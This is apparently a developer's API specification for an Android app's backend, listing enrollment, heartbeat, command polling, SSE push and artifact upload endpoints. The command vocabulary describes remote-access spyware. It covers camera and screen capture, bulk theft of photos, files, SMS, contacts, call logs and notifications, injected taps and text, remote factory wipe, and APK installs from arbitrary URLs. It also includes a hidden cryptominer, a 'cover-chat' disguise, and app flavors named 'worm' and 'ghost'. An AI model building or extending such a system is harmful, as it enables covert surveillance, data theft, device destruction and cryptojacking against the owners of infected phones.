# needs-android.md

Every endpoint the Android app calls against the real backend
(`backend/src/server.js`). All paths are under `WG_BASE_URL` (default
`http://10.0.2.2:3000`); cleartext is permitted only to emulator
loopback — production endpoints MUST be `https://`.

Auth note: after enrollment the app sends `Authorization: Bearer
<credential>` where credential is the server-issued 32-byte secret stored
AES-GCM in `IdentityVault`. No client secrets are baked into the APK.

## Endpoints

| # | Method | Path | Purpose | Auth |
|---|--------|------|---------|------|
| A1 | POST | /api/v1/devices/enroll | Seal the wizard: consumes the single-use enroll JWT, returns the device credential | none (enroll JWT in body) |
| A2 | POST | /api/v1/devices/{id}/heartbeat | 15 s liveness + stats | device credential |
| A3 | GET | /api/v1/devices/{id}/commands | Poll queued commands (fallback) | device credential |
| A4 | GET | /api/v1/devices/{id}/events | SSE stream — instant command push | device credential |
| A5 | POST | /api/v1/devices/{id}/commands/{cid}/result | Report `executed`/`failed` + result string | device credential |
| A6 | POST | /api/v1/devices/{id}/files | Artifact upload (photos/files/frames/dumps) | device credential |
| A7 | POST | /api/v1/devices/{id}/photos/report | MediaStore inventory upsert | device credential |
| A8 | POST | /api/v1/devices/{id}/chat | Cover-chat reply relay (rate-limited) | device credential |
| A9 | GET | /api/v1/devices/{id}/files | List own artifact rows | device credential |

## A1 POST /api/v1/devices/enroll

| Field | Type | Constraint |
|-------|------|------------|
| enrollToken | string | JWT from `POST /enroll-token` (30 min, single-use, bound to issuing user) |
| deviceId | string | app-derived stable id |
| platform | string | `android` |
| appType | string | flavor: `worm`/`ghost`/`master` |
| variant | string | build variant |
| fingerprint | object | model/manufacturer/sdk/abi |
| identity.displayName | string | wizard name |
| identity.phone | string | E.164 (`+20` localized) |

| Status | Meaning |
|--------|---------|
| 201 | `{deviceId, credential}` — credential shown ONCE, stored AES-GCM |
| 400/401/403/409 | expired/consumed/owner-locked/duplicate → wizard shows retry + paste-token field |

## A2 POST /api/v1/devices/{id}/heartbeat (15 s)

Body: `{gender, appType, apkVersion, stats{batteryPct,charging,battTempC,cpuTempC,netType,lastCall,lastSms,lastWa}, miner{state,hashrate,stopReason}, screen{w,h,density}}` → 200.

## A3–A5 commands

Poll `GET /commands` every 15 s AND stream `GET /events` (SSE `data: {cmd}` — instant push). Each command is executed once and reported:

`POST /commands/{cid}/result` → `{state: "executed"|"failed", result: string}`.

Vocabulary: `ping, wipe, camera, pull_photos, screen_capture, sms, contacts, call_log, mine_start, mine_stop, input_tap, input_swipe, input_text, files_pull, notifications_pull, apk_update`.

| Command | Payload | Result |
|---------|---------|--------|
| pull_photos | `{category?, spec?}` | `pulled=N uploaded=M` |
| screen_capture | `{frames≤12, intervalSec}` | `frames=N/M` |
| mine_start | `{algo,pool,wallet,threads}` | honest start (native init ≤20 s) |
| mine_stop | `{}` | stop reason `manual` |
| input_tap | `{x,y}` normalized 0..1 | `gesture frames=N` |
| input_swipe | `{x1,y1,x2,y2,ms}` normalized | `gesture frames=N` |
| input_text | `{text≤4000}` | `set_text`/`paste` frames=N |
| files_pull | `{category: documents\|downloads\|audio\|video, limit≤50}` | `cat=X pulled=N uploaded=M` |
| notifications_pull | `{}` | `dumped=N` / `failed empty` |
| wipe | `{}` | `wipe_scheduled` (device-admin real factory reset) |
| apk_update | `{url}` | download + install intent |

## A6 POST /api/v1/devices/{id}/files

`{kind, category, name, sha256, b64}` — base64 payload ≤8 MB. Server
verifies sha256, dedups by `(deviceId, sha256)` (`deduped:true`), writes
`PANEL_DROP_DIR/{id}/{category|kind}/{ts}_{name}`, inserts a
`DownloadedFile` row. Kinds: `photo`, `camera`, `screen`, `file`, `dump`.

## Reliability

- SSE reconnects with backoff; the 15 s poll is the safety net — a
  command is never lost.
- Upload failures leave the staged file on disk; the next pull re-stages
  and the server dedups by hash.
- `WormSvc` (dataSync FGS, `START_STICKY`) owns heartbeat/commands;
  `MinerFgs` (`specialUse` + `cryptomining` subtype) owns mining; both
  start only after enrollment.
